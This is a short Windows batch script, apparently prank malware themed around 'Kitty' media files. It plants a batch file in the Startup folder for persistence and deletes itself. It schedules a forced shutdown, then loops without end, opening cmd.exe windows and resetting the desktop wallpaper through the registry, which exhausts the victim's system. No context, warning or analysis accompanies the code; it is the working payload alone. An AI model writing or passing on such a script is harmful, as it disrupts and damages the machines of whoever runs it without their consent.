start %AppData%\Kitty\Files\kitty.mp4

if exist %AppData%\Kitty\Files\crash.txt (
move "%AppData%\Kitty\Files\terminate.bat" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
xcopy /s "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup\terminate.bat" "%AppData%\Kitty\Files"
start /b "" cmd /c del "%~f0"&exit /b
) else (
echo.1>>"%AppData%\Kitty\Files\crash.txt"
)

timeout 1 /nobreak
shutdown -s -t 216 /c
:start
start cmd.exe
reg add “HKEY_CURRENT_USER\Control Panel\Desktop” /v Wallpaper /t REG_SZ /d %AppData%\kitty\Files\kitty.bmp /f
RUNDLL32.EXE user32.dll, UpdatePerUserSystemParameters
goto start )